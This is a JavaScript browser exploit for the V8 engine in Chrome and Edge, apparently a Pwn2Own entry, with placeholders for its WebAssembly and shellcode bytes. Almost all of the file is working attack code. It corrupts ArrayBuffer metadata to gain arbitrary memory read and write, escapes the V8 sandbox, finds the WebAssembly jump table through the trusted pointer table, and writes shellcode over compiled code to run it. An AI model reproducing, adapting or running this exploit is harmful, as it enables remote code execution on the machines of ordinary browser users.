const wasm_bytes = new Uint8Array([ $WASM_BYTES$ ]);
const typeidx_offsets = [ $TYPE_OFFSETS$ ]
const wasm2_bytes = new Uint8Array([ $WASM2_BYTES$ ]);

const shellcode = new Uint8Array([ $SHELLCODE_BYTES$ ]);

const M32 = 2n**32n-1n;
const M64 = 2n**64n-1n;
const GC_ITERS = 80000; // a bit unstable for 1000
const TRAIN_ITERS = 200000; // a bit unstable for 20000, higher seems better
const MAX_NUDGE = 2000n;
const IN_BROWSER = (globalThis.window !== undefined);


log("doing GC..."); 
let garbage = {};
let garbagesum = 0;
for (let i = 0; i < GC_ITERS; i++) {garbage = new Array(1000); garbage.fill(5.5); garbagesum+=garbage[i&7]}
log("GC done.");

const CONSTS = {
    JSArrayBufferView_kRawByteOffsetOffset: 16n, // JSArrayBufferView::kRawByteOffsetOffset
    JSArrayBufferView_kRawByteLengthOffset: 24n,
    JSArrayBufferView_kBitFieldOffset: 32n,
    JSArrayBufferView_kIsLengthTracking: 1n,
    JSArrayBufferView_kIsBackedByRab: 2n,
    
    JSArrayBuffer_bitmask_is_shared: 1n<<4n,
    JSArrayBuffer_kRawByteLengthOffset: 16n,
    JSArrayBuffer_kBitFieldOffset: 44n,
    
    JSTypedArray_kExternalPointerOffset: 44n,
    
    JSFunction_kCodeOffset: 12n,
    JSFunction_kCodeIndirectPointerTag: 0xce000000000000n,
    

    
    kBoundedSizeShift: 29n,
    kSandboxedPointerShift: 24n,   
    MemoryChunkHeader_kAlignmentMask: 0x3ffffn,
    
    // ptype /o v8::internal::BasicMemoryChunk
    BasicMemoryChunk_heap: 16n, 
    BasicMemoryChunk_area_start: 24n,
    
    WasmInstanceObject_kTrustedDataOffset: 12n,
    kWasmTrustedInstanceDataIndirectPointerTag: 0xd0000000000000n,
  
    
    kTrustedPointerHandleShift: 9n,
    
    //it's ok if the following are a bit off, we'll nudge them in place
    isolate_off_heap: 0xddc8n,
    isolate_off_trusted_pointer_table: 600n,
    WasmTrustedInstanceData_kJumpTableStartOffset: 56n+16n, // +0 for upstream  v8, +16 for chrome, +24 for edge
}

function log(...args) {
    let s = args.join("");
    console.log(s);
    if (IN_BROWSER) {
        globalThis.document.getElementById("log").innerText += s + "\n";
    }
}

function hex64(v) {
    return "0x"+v.toString(16).padStart(16,"0");
}
function logAddr(name, addr) {
    log(name+" @ "+hex64(addr));
}

async function tryGetWasmFor(typeidx) {
    for (const idx of typeidx_offsets) {
        wasm_bytes[idx] = typeidx;
    }
    try{
        let mod = await WebAssembly.instantiate(wasm_bytes, {});
        let r = mod.instance.exports.addrOf({});
        if (!r) return null;
        return mod
    } catch(e) {
        return null
    }
}

/* A small stability hack to keep this exploit running on different versions
 * if the type idx of the "None" type changes (for example, Edge canary differs from stable Chrome/Edge by 1).
 * These are 128+(actual_typeidx%128) due to the way integers are encoded in WASM.
 */
const possible_typeindices = [204, 205, 203, 206, 202, 207, 201];
async function getWasm() {
    for (const typeidx of possible_typeindices) {
        let mod = await tryGetWasmFor(typeidx);
        if (mod) {
            return mod;
        } else {
            log("Failed for ",typeidx);
        }
    }
    throw RangeError("Couldn't instantiate.");
}


let wasm_mod =  await getWasm();

let wasm_instance = wasm_mod.instance;
let wasm = wasm_instance.exports;


const convert_buf = new ArrayBuffer(8);
const convert_view = new DataView(convert_buf);
function f64ToU64(a) {
    convert_view.setFloat64(0,a);
    return convert_view.getBigUint64(0);
}
function u64ToF64(a) {
    convert_view.setBigUint64(0,a);
    return convert_view.getFloat64(0);
}

const gsab = new ArrayBuffer(8, { maxByteLength: 16 });
const gsab_array = new Uint16Array(gsab);
let ab = new ArrayBuffer(16);
let ab_array = new Uint8Array(ab);
gsab_array[5];
let gsab_array_addr = wasm.addrOf(gsab_array);
logAddr("array",gsab_array_addr);

log("doing GC..."); // do GC sooner rather than later so that we have stable addresses for objects
for (let i = 0; i < GC_ITERS; i++) {garbage = new Array(1000); garbage.fill(5.5); garbagesum+=garbage[i&7]}
log("GC done.");


/* The gigacage bypass needs a Growable Shared ArrayBuffer (GSAB).
 * Unfortunately, those are only available in secure contexts (https). Rather than going
 * through the hassle of setting up some solution for a Pwn2Own-compatible https setup
 * we can just use a normal (resizable) ArrayBuffer and make it shared ourselves.
 *
 * Actually using WebAssembly.Memory instead would probably work too - but I only discovered this
 * after building the fakery below.
 */
gsab_array_addr = wasm.addrOf(gsab_array);
logAddr("array",gsab_array_addr);
const gsab_addr = wasm.addrOf(gsab)&M32;
logAddr("buffer",gsab_addr);


let bitfield = wasm.read64SBX(gsab_array_addr + CONSTS.JSArrayBufferView_kBitFieldOffset);
let gsab_bitfield = wasm.read64SBX(gsab_addr + CONSTS.JSArrayBuffer_kBitFieldOffset);
//log("bitfield: ",hex64(bitfield));
//log("gsab bitfield",hex64(gsab_bitfield));
wasm.write64SBX(gsab_array_addr + CONSTS.JSArrayBufferView_kRawByteLengthOffset, 0n);
wasm.write64SBX(gsab_addr + CONSTS.JSArrayBuffer_kRawByteLengthOffset, 0n);
wasm.write64SBX(gsab_array_addr + CONSTS.JSArrayBufferView_kBitFieldOffset, (bitfield | CONSTS.JSArrayBufferView_kIsLengthTracking) & ~CONSTS.JSArrayBufferView_kIsBackedByRab);
wasm.write64SBX(gsab_addr + CONSTS.JSArrayBuffer_kBitFieldOffset, gsab_bitfield|CONSTS.JSArrayBuffer_bitmask_is_shared);
bitfield = wasm.read64SBX(gsab_array_addr + CONSTS.JSArrayBufferView_kBitFieldOffset);
gsab_bitfield = wasm.read64SBX(gsab_addr + CONSTS.JSArrayBuffer_kBitFieldOffset);
//log("bitfield: ",hex64(bitfield));
//log("gsab bitfield",hex64(gsab_bitfield));
gsab_array[4] = 123;
gsab_array[3];


function getBackingstore(arr) {
    let addr = wasm.addrOf(arr);
    return (wasm.read64SBX(addr + CONSTS.JSTypedArray_kExternalPointerOffset)>>CONSTS.kSandboxedPointerShift)+cage_base;
}
/* Set the backing store address of some typed array.
 * This intentionally loses the top bits of the address if they don't fit inside the sandboxed pointer
 * for the gigacage! We'll only use this to prevent precision loss when we later have to give an address
 * difference as a double.
 */
function setBackingstore(arr, bs) {
    let addr = wasm.addrOf(arr);
    wasm.write64SBX(addr + CONSTS.JSTypedArray_kExternalPointerOffset, M64 & ((bs-cage_base)<<CONSTS.kSandboxedPointerShift));
}


const memory_chunk_addr = gsab_addr & ~CONSTS.MemoryChunkHeader_kAlignmentMask;
logAddr("memory chunk",memory_chunk_addr);
const heap_addr = wasm.read64SBX(memory_chunk_addr+1n+CONSTS.BasicMemoryChunk_heap);
logAddr("heap",heap_addr);
const cage_base = wasm.read64SBX(memory_chunk_addr+1n+CONSTS.BasicMemoryChunk_area_start)&~M32;
logAddr("cage_base",cage_base);
const gsab_backingstore_orig = getBackingstore(gsab_array);
logAddr("store",gsab_backingstore_orig);


function readGSAB(arr,addr) {
    let blind = 0;
    for (let i = 0; i < 100; i++){
        let j = i>>1;
        blind ^= j*3.5+1234.7;
    }
    return arr[Number(addr)]+blind;
}

function writeGSAB(arr,addr,val) {
    let blind = 0;
    for (let i = 0; i < 100; i++){
        let j = i>>1;
        blind ^= j*3.5+1234.7;
    }
    arr[Number(addr)]=val+blind;
    return 5;
}


let r = 0;
log("training read...");
for (let i = 0; i < TRAIN_ITERS; i++) {r += eval(Math.random()+",readGSAB(gsab_array,3n)")}
log("training write...");
for (let i = 0; i < TRAIN_ITERS; i++) {eval(Math.random()+",writeGSAB(gsab_array,3n,i&1027)")}
log("training done.");


function read16(addr) {
    return eval(`
    let __rand = `+Math.random()+`;
    setBackingstore(gsab_array, cage_base+(0xffffn&addr));     // this prevents imprecision when converting the address to double below
    let diffaddr = (M64&(addr-getBackingstore(gsab_array)));
    if (diffaddr & 1n) log ("Warning: non-aligned 16 bit read " + hex64(diffaddr));
    diffaddr >>= 1n;
    if (BigInt(Number(diffaddr)) !== diffaddr) log("warning: "+hex64(addr)+" has rounding errors (diffaddr " + hex64(diffaddr) + ") - this shouldn't happen!");
    let res = BigInt(readGSAB(gsab_array,diffaddr));
    setBackingstore(gsab_array, gsab_backingstore_orig);
    res
    `);
}
function write16(addr, val) {
    return eval(`
    let __rand = `+Math.random()+`;
    setBackingstore(gsab_array, cage_base+(0xffffn&addr));        
    let diffaddr = (M64&(addr-getBackingstore(gsab_array)));
    if (diffaddr & 1n) log ("Warning: non-aligned 16 bit write");
    diffaddr >>= 1n;    
    if (BigInt(Number(diffaddr)) !== diffaddr) log("warning: "+hex64(addr)+" has rounding errors (diffaddr " + hex64(diffaddr) + ") - this shouldn't happen!");    
    writeGSAB(gsab_array,diffaddr, Number(val)&0xffff);
    setBackingstore(gsab_array, gsab_backingstore_orig);
    `);
}

function read32(addr) {
    let res = 0n;
    for (let i = 0n; i<2n; i++) {
        res |= read16(addr+2n*i)<<(16n*i);
    }
    return res;
}

function read64(addr) {
    let res = 0n;
    for (let i = 0n; i<4n; i++) {
        res |= read16(addr+2n*i)<<(16n*i);
    }
    return res;
}

function write64(addr, val) {
    for (let i = 0n; i <4n; i++) {
        write16(addr+2n*i, Number((val>>(16n*i))&0xffffn));
    }
}

function addrOfReal(obj) {
    return cage_base + (wasm.addrOf(obj)&0xffffFFFEn); // ...E to get rid of pointer tagging
}


// the all-important line to escape the v8 sandbox!
wasm.write64SBX(M32&gsab_array_addr+CONSTS.JSArrayBufferView_kRawByteOffsetOffset, 20n<<CONSTS.kBoundedSizeShift);



/* Some offsets are quite unstable across browser version/v8 build. So we just start with a good guess of 
 * where the offset might be and walk in both directions until we hit something that looks plausible.
 */
function nudge(name, test, addr, align=8n) {
    if (test(addr)) {
        logAddr(name, addr);
        return addr;
    }
    for (let i = 0n; i < MAX_NUDGE; i++) {
        if (test(addr+i*align)) {
            log(name + " @ " + hex64(addr+i*align) + " (nudged by +"+i+"*"+align+")");
            return addr+i*align;
        }
        if (test(addr-i*align)) {
            log(name + " @ " + hex64(addr-i*align) + " ( nudged by -"+i+"*"+align+")");
            return addr-i*align;
        }
    }
    log("Warning: nudge for " + name + " failed! Returning original address " + hex64(addr) + " as a last resort...");
    return addr;
}

function testIsolate(addr) {
    return read64(addr) == cage_base;
}
function testTrustedTablePtr(addr) {
    let trusted_cage_base = read64(addr-8n);
    if (!(trusted_cage_base) || (trusted_cage_base & 0xffff0000ffffffffn)) return false;
    return read64(addr) && read64(addr+8n) && !read64(addr+16n);
}


function decodeRelJump(addr) { // only call with 64-bit aligned addr
    let op = read64(addr);
    let bits, rel, len;
    if ((op & 0xFFn) == 0xEBn) {
        bits = 8n;
        len =  2n;
        rel = (op>>8n)&0xffn;
    } else if ((op & 0xFFn) == 0xE9n) {
        bits = 32n;
        len = 5n;
        rel = (op>>8n)&0xffffFFFFn;
    } else {
        log("Warning: invalid jump opcode ",hex(op));
        return addr;
    }
    if (rel >= 1n << (bits-1n)) rel -= 1n << bits; // make signed
    return addr + len + rel;
}

let isolate_addr = nudge("isolate", testIsolate, heap_addr - CONSTS.isolate_off_heap);
log("isolate "+hex64(read64(isolate_addr)))
let trusted_table_ptr = nudge("trusted table ptr", testTrustedTablePtr, isolate_addr + CONSTS.isolate_off_trusted_pointer_table); 
log("trusted cage "+hex64(read64(trusted_table_ptr-8n)))

log("compiling wasm...");
const target_mod =  await WebAssembly.instantiate(wasm2_bytes, {});
let target_instance = target_mod.instance;
let wasm_instance_addr = addrOfReal(target_instance);
let r2 = 0;
for (let i = 0; i < TRAIN_ITERS; i++) r2 += target_instance.exports.nopnop(1234);
log("done.");

logAddr("wasm instance", wasm_instance_addr);
let trusted_instance_handle = read32(wasm_instance_addr + CONSTS.WasmInstanceObject_kTrustedDataOffset);
log("trusted instance handle " + hex64(trusted_instance_handle));
let trusted_instance_index = trusted_instance_handle >> CONSTS.kTrustedPointerHandleShift;
if ((trusted_instance_index << CONSTS.kTrustedPointerHandleShift) !== trusted_instance_handle) log("Warning: Trusted instance handle weirdness.");
let trusted_table = read64(trusted_table_ptr);
logAddr("trusted table",trusted_table);
let trusted_instance = read64(trusted_table + 8n * trusted_instance_index);
logAddr("trusted instance",trusted_instance);

function testJumpTableStartPtr(addr) {
    let val = read64(addr);
    if (!val) return false;
    if (val&7n) return false; // jump table should be aligned
    if (read32(addr-8n) != 0xffffFFFFn) return false; // jump table start should follow globals start (=empty array buffer)
    return true;
}


let jump_table_ptr = nudge("jump table start ptr", testJumpTableStartPtr, trusted_instance + CONSTS.WasmTrustedInstanceData_kJumpTableStartOffset);
let jump_table = read64(jump_table_ptr);

logAddr("jump table",jump_table);
let code = decodeRelJump(jump_table);
logAddr("code",code);


let shellcode_view = new BigUint64Array(shellcode.buffer);
for (let i = 0n; i < shellcode_view.length; i++) {
    write64(code+i*8n, shellcode_view[i]);
}

log(hex64(target_instance.exports.nopnop(1)));


// Cleanup:
setBackingstore(gsab_array, gsab_backingstore_orig);
